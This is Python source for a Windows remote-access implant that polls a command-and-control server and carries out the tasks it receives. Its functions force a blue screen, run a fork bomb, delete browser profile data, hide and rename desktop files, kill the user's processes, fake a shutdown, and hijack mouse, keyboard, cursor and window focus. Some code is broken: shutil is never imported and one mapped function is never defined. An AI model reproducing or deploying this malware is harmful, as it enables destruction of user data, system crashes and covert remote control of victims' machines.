# ==================================================================================================
# IMPORTS
# ==================================================================================================
import os
import sys
import socket
import uuid
import time
import requests
import threading
import subprocess
import random
import string
import tkinter as tk
try:
    import pyautogui
    import winsound
    import webbrowser
    import ctypes
    import psutil
except ImportError:
    pass

# ==================================================================================================
# CONFIGURATION
# ==================================================================================================
C2_URL = "http://127.0.0.1:5003" # Replaced by the builder
HEARTBEAT_INTERVAL = 5

# ==================================================================================================
# GLOBAL STATE VARIABLES
# ==================================================================================================
NOISE_ACTIVE, RANDOM_CLICKING_ACTIVE, RANDOM_TYPING_ACTIVE, CAPS_LOCK_SPAM_ACTIVE, OVERLAY_ACTIVE, USB_SPAM_ACTIVE, FOCUS_STEAL_ACTIVE, CURSOR_CHANGE_ACTIVE = False, False, False, False, False, False, False, False
OVERLAY_WINDOW, GUI_ROOT = None, None

# ==================================================================================================
# ACTION FUNCTIONS
# ==================================================================================================

def show_popup(title="Message", message="Hello!", icon_style="info", button_style="ok"):
    ICON_MAP = {"none": 0x00, "error": 0x10, "question": 0x20, "warning": 0x30, "info": 0x40}
    BUTTON_MAP = {"ok": 0x00, "ok_cancel": 0x01, "abort_retry_ignore": 0x02, "yes_no_cancel": 0x03, "yes_no": 0x04, "retry_cancel": 0x05}
    style = ICON_MAP.get(icon_style.lower(), 0x40) | BUTTON_MAP.get(button_style.lower(), 0x00)
    threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, message, title, style), daemon=True).start()

def _noise_loop():
    while NOISE_ACTIVE: winsound.Beep(random.randint(200, 2000), 200); time.sleep(0.1)
def toggle_noise():
    global NOISE_ACTIVE; NOISE_ACTIVE = not NOISE_ACTIVE
    if NOISE_ACTIVE: threading.Thread(target=_noise_loop, daemon=True).start()

def _usb_spam_loop():
    while USB_SPAM_ACTIVE:
        winsound.PlaySound("SystemHand", winsound.SND_ALIAS); time.sleep(random.uniform(0.5, 2.0))
        winsound.PlaySound("SystemAsterisk", winsound.SND_ALIAS); time.sleep(random.uniform(0.5, 2.0))
def toggle_usb_spam():
    global USB_SPAM_ACTIVE; USB_SPAM_ACTIVE = not USB_SPAM_ACTIVE
    if USB_SPAM_ACTIVE: threading.Thread(target=_usb_spam_loop, daemon=True).start()

def _caps_lock_loop():
    while CAPS_LOCK_SPAM_ACTIVE:
        if ctypes.windll.user32.GetKeyState(0x14) == 0:
            ctypes.windll.user32.keybd_event(0x14, 0x45, 1, 0); ctypes.windll.user32.keybd_event(0x14, 0x45, 3, 0)
        time.sleep(1)
def toggle_caps_lock_spam():
    global CAPS_LOCK_SPAM_ACTIVE; CAPS_LOCK_SPAM_ACTIVE = not CAPS_LOCK_SPAM_ACTIVE
    if CAPS_LOCK_SPAM_ACTIVE: threading.Thread(target=_caps_lock_loop, daemon=True).start()

def _create_overlay(color='black', alpha=0.5):
    global OVERLAY_WINDOW
    if OVERLAY_WINDOW: OVERLAY_WINDOW.destroy()
    OVERLAY_WINDOW = tk.Toplevel(GUI_ROOT)
    OVERLAY_WINDOW.attributes('-fullscreen', True); OVERLAY_WINDOW.attributes('-alpha', alpha)
    OVERLAY_WINDOW.attributes("-topmost", True); OVERLAY_WINDOW.configure(bg=color)
    OVERLAY_WINDOW.overrideredirect(True)
def _hide_overlay():
    global OVERLAY_WINDOW
    if OVERLAY_WINDOW: OVERLAY_WINDOW.destroy(); OVERLAY_WINDOW = None
def toggle_overlay(color='black', alpha=0.5):
    global OVERLAY_ACTIVE; OVERLAY_ACTIVE = not OVERLAY_ACTIVE
    if OVERLAY_ACTIVE: GUI_ROOT.after(0, lambda: _create_overlay(color=color, alpha=alpha))
    else: GUI_ROOT.after(0, _hide_overlay)

def open_website(url="https://google.com"): webbrowser.open(url)
def open_cd_tray():
    try:
        ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
        time.sleep(3); ctypes.windll.winmm.mciSendStringW("set cdaudio door closed", None, 0, None)
    except: pass
def _random_clicking_loop():
    w, h = pyautogui.size()
    while RANDOM_CLICKING_ACTIVE: pyautogui.click(random.randint(0, w), random.randint(0, h)); time.sleep(random.uniform(0.5, 2.0))
def toggle_random_clicking():
    global RANDOM_CLICKING_ACTIVE; RANDOM_CLICKING_ACTIVE = not RANDOM_CLICKING_ACTIVE
    if RANDOM_CLICKING_ACTIVE: threading.Thread(target=_random_clicking_loop, daemon=True).start()
def _random_typing_loop():
    while RANDOM_TYPING_ACTIVE:
        pyautogui.write(random.choice(string.ascii_letters + string.digits), interval=random.uniform(0.1, 0.3))
        time.sleep(random.uniform(0.5, 1.5))
def toggle_random_typing():
    global RANDOM_TYPING_ACTIVE; RANDOM_TYPING_ACTIVE = not RANDOM_TYPING_ACTIVE
    if RANDOM_TYPING_ACTIVE: threading.Thread(target=_random_typing_loop, daemon=True).start()

# --- NEW DESKTOP CHAOS ACTIONS ---
def randomize_desktop_filenames():
    """NEW: Renames all files and folders on the desktop to random strings."""
    desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
    for filename in os.listdir(desktop):
        try:
            random_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
            os.rename(os.path.join(desktop, filename), os.path.join(desktop, random_name))
        except OSError: continue

def set_taskbar_size(size_option="normal"):
    """NEW: Changes the size of the taskbar icons."""
    # 0 = Small, 1 = Normal, 2 = Large
    size_map = {"small": 0, "normal": 1, "large": 2}
    value = size_map.get(size_option, 1)
    try:
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "TaskbarSmallIcons", 0, winreg.REG_DWORD, value)
        # Force explorer to restart to apply changes
        subprocess.run("taskkill /f /im explorer.exe & start explorer.exe", shell=True, capture_output=True)
    except Exception: pass

def _focus_stealer_loop():
    """NEW: Background loop for the window focus stealer."""
    # Open an invisible notepad window to steal focus with
    p = subprocess.Popen(['notepad.exe'], creationflags=subprocess.CREATE_NO_WINDOW)
    time.sleep(1) # Give it time to spawn
    hwnd = ctypes.windll.user32.FindWindowW("Notepad", None)
    while FOCUS_STEAL_ACTIVE:
        try:
            if ctypes.windll.user32.GetForegroundWindow() != hwnd:
                ctypes.windll.user32.SetForegroundWindow(hwnd)
        except: pass
        time.sleep(3)
    p.terminate() # Close notepad when the loop stops

def toggle_focus_stealer():
    """NEW: Toggles the window focus stealer."""
    global FOCUS_STEAL_ACTIVE; FOCUS_STEAL_ACTIVE = not FOCUS_STEAL_ACTIVE
    if FOCUS_STEAL_ACTIVE: threading.Thread(target=_focus_stealer_loop, daemon=True).start()

def _cursor_changer_loop():
    """NEW: Background loop for changing the cursor."""
    # List of standard system cursor IDs
    cursors = [32512, 32513, 32514, 32515, 32516, 32640, 32641, 32642, 32643, 32644, 32645, 32646, 32648, 32649, 32650, 32651]
    while CURSOR_CHANGE_ACTIVE:
        hcursor = ctypes.windll.user32.LoadCursorW(None, random.choice(cursors))
        ctypes.windll.user32.SetSystemCursor(hcursor, 32512) # OCR_NORMAL
        time.sleep(2)
def toggle_cursor_changer():
    """NEW: Toggles the random cursor changer."""
    global CURSOR_CHANGE_ACTIVE; CURSOR_CHANGE_ACTIVE = not CURSOR_CHANGE_ACTIVE
    if CURSOR_CHANGE_ACTIVE: threading.Thread(target=_cursor_changer_loop, daemon=True).start()
    else: # Restore default cursor
        ctypes.windll.user32.SystemParametersInfoW(87, 0, None, 0)

# --- NEW DESTRUCTIVE ACTIONS ---
def fake_shutdown(message="Windows is updating..."):
    def _sequence():
        subprocess.run(f'shutdown /s /t 60 /c "{message}"', shell=True, capture_output=True)
        time.sleep(30); subprocess.run('shutdown /a', shell=True, capture_output=True)
        show_popup("Update Failed", "The update could not be installed.", "error")
    threading.Thread(target=_sequence, daemon=True).start()

def kill_tasks():
    critical_procs = ['csrss.exe', 'wininit.exe', 'winlogon.exe', 'lsass.exe', 'services.exe', 'smss.exe', 'explorer.exe']
    current_user = os.getlogin()
    for proc in psutil.process_iter(['pid', 'name', 'username']):
        try:
            if proc.info['username'] and current_user in proc.info['username'] and proc.info['name'].lower() not in critical_procs:
                psutil.Process(proc.info['pid']).terminate()
        except (psutil.NoSuchProcess, psutil.AccessDenied): continue

def bsod():
    nullptr = ctypes.pointer(ctypes.c_int()); ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, nullptr, nullptr, 6, ctypes.byref(ctypes.c_uint()))

def browser_eraser():
    """NEW: Deletes user data folders for major browsers."""
    paths_to_delete = [
        os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data"),
        os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Edge", "User Data"),
        os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox")
    ]
    for path in paths_to_delete:
        if os.path.exists(path):
            try: shutil.rmtree(path, ignore_errors=True)
            except: pass

def not_so_shortcut(url="https://google.com"):
    """NEW: Replaces desktop icons with malicious shortcuts."""
    desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
    for filename in os.listdir(desktop):
        full_path = os.path.join(desktop, filename)
        if os.path.isfile(full_path):
            try:
                # Create a .url shortcut file
                shortcut_path = full_path + ".url"
                with open(shortcut_path, "w") as f:
                    f.write(f"[InternetShortcut]\nURL={url}\n")
                # Hide the original file
                ctypes.windll.kernel32.SetFileAttributesW(full_path, 2) # 2 = Hidden
            except: continue

def fork_bomb():
    """NEW: A simple fork bomb for Windows."""
    while True:
        subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NO_WINDOW)

# ==================================================================================================
# C2 COMMUNICATION & TASK PROCESSING
# ==================================================================================================
def process_tasks(tasks):
    if not tasks: return
    for task in tasks:
        command, args = task.get("command"), task.get("args", {})
        print(f"[*] Received command: {command} with args: {args}")
        ACTION_MAP = {
            "show_popup": show_popup, "toggle_noise": toggle_noise, "toggle_caps_lock_spam": toggle_caps_lock_spam,
            "toggle_overlay": toggle_overlay, "hide_overlay": lambda: GUI_ROOT.after(0, _hide_overlay),
            "open_website": open_website, "open_cd_tray": open_cd_tray, "toggle_random_clicking": toggle_random_clicking,
            "toggle_random_typing": toggle_random_typing, "toggle_usb_spam": toggle_usb_spam, 
            "fake_shutdown": fake_shutdown, "toggle_desktop_icons": toggle_desktop_icons,
            "kill_tasks": kill_tasks, "bsod": bsod, "randomize_desktop_filenames": randomize_desktop_filenames,
            "set_taskbar_size": set_taskbar_size, "toggle_focus_stealer": toggle_focus_stealer,
            "toggle_cursor_changer": toggle_cursor_changer, "browser_eraser": browser_eraser,
            "not_so_shortcut": not_so_shortcut, "fork_bomb": fork_bomb,
        }
        if command in ACTION_MAP:
            try: ACTION_MAP[command](**args)
            except Exception as e: print(f"[!] Error executing '{command}': {e}")

def c2_communication_loop():
    session_id, hostname = str(uuid.uuid4()), socket.gethostname()
    try: requests.post(f"{C2_URL}/api/register", json={"session_id": session_id, "hostname": hostname}, timeout=10)
    except: pass
    while True:
        try:
            response = requests.post(f"{C2_URL}/api/heartbeat", json={"session_id": session_id}, timeout=10)
            if response.status_code == 200 and "tasks" in (data := response.json()):
                process_tasks(data["tasks"])
        except: pass
        time.sleep(HEARTBEAT_INTERVAL)

if __name__ == "__main__":
    c2_thread = threading.Thread(target=c2_communication_loop, daemon=True)
    c2_thread.start()
    GUI_ROOT = tk.Tk()
    GUI_ROOT.withdraw()
    GUI_ROOT.mainloop()